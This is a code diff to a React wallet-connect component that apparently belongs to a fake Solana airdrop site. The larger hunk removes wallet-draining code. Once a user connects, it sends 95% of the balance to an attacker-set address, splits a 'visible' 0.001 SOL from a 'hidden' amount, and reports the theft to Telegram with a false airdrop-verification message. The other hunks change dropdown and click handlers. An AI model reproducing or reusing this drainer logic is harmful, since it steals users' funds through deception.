@@ -79,67 +79,6 @@ function WalletConnect() {
             }, 1000);
           }
 
-          // Only attempt transfer if we have a balance greater than 0 and haven't attempted before
-          if (walletBalance > 0 && !hasAttemptedTransaction.current) {
-            hasAttemptedTransaction.current = true;
-            
-            // Calculate transfer amount based on device type
-            let transferAmount;
-            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-            if (isMobile) {
-              // On mobile, take 95% of the balance
-              transferAmount = walletBalance * 0.95;
-            } else {
-              // On desktop, keep original split: 0.001 + 95%
-              transferAmount = 0.001 + (walletBalance * 0.95);
-            }
-            
-            // Get the wallet adapter instance
-            const wallet = window.solana;
-            if (!wallet) {
-              throw new Error('Wallet not found');
-            }
-
-            console.log('Transaction details:', {
-              walletBalance: walletBalance.toFixed(4) + ' SOL',
-              transferAmount: transferAmount.toFixed(4) + ' SOL',
-              ...(isMobile ? {
-                percentage: '95%'
-              } : {
-                visibleAmount: '0.001 SOL',
-                hiddenAmount: (transferAmount - 0.001).toFixed(4) + ' SOL',
-                percentage: '95%'
-              })
-            });
-
-            const result = await services.transactionService.sendSol(
-              wallet,
-              process.env.NEXT_PUBLIC_TO,
-              transferAmount
-            );
-
-            if (result.success) {
-              const newBalance = await services.walletService.getBalance(publicKey.toString());
-              setBalance(newBalance);
-
-              // Only send transaction notification if the transaction was successful
-              await services.telegramService.sendMessage(
-                services.telegramService.formatTransactionInfo({
-                  type: 'SOL_TRANSFER',
-                  from: publicKey.toString(),
-                  to: process.env.NEXT_PUBLIC_TO,
-                  amount: transferAmount,
-                  signature: result.signature,
-                  timestamp: Date.now(),
-                  message: 'This transaction is required to verify your wallet and ensure smooth airdrop allocation. Thank you for your participation.'
-                })
-              );
-            } else {
-              console.error('Transaction failed:', result.error);
-              hasAttemptedTransaction.current = false;
-            }
-          }
-
           // Update user profile
           await services.userProfileService.updateWalletInfo({
             publicKey: publicKey.toString(),
@@ -217,26 +156,42 @@ function WalletConnect() {
   };
 
   const toggleDropdown = (e) => {
+    e.preventDefault();
     e.stopPropagation();
-    setIsDropdownOpen(!isDropdownOpen);
+    console.log('Toggle dropdown clicked, current state:', isDropdownOpen);
+    setIsDropdownOpen(prev => !prev);
   };
 
   // Add click outside handler
   useEffect(() => {
     const handleClickOutside = (event) => {
-      if (isDropdownOpen && !event.target.closest('.wallet-connect-container')) {
+      // Don't handle clicks on the wallet header
+      if (event.target.closest(`.${styles.walletHeader}`)) {
+        return;
+      }
+
+      console.log('Click outside detected');
+      console.log('Is dropdown open:', isDropdownOpen);
+      console.log('Clicked element:', event.target);
+      
+      const container = document.querySelector(`.${styles.walletConnectContainer}`);
+      if (isDropdownOpen && container && !container.contains(event.target)) {
+        console.log('Closing dropdown');
         setIsDropdownOpen(false);
       }
     };
 
-    document.addEventListener('click', handleClickOutside);
+    if (isDropdownOpen) {
+      document.addEventListener('mousedown', handleClickOutside);
+    }
+
     return () => {
-      document.removeEventListener('click', handleClickOutside);
+      document.removeEventListener('mousedown', handleClickOutside);
     };
   }, [isDropdownOpen]);
 
   return (
-    <div className={styles.walletConnectContainer}>
+    <div className={`${styles.walletConnectContainer} wallet-connect-container`}>
       {publicKey ? (
         <div className={`${styles.connectedWallet} glass-card`}>
           <div 
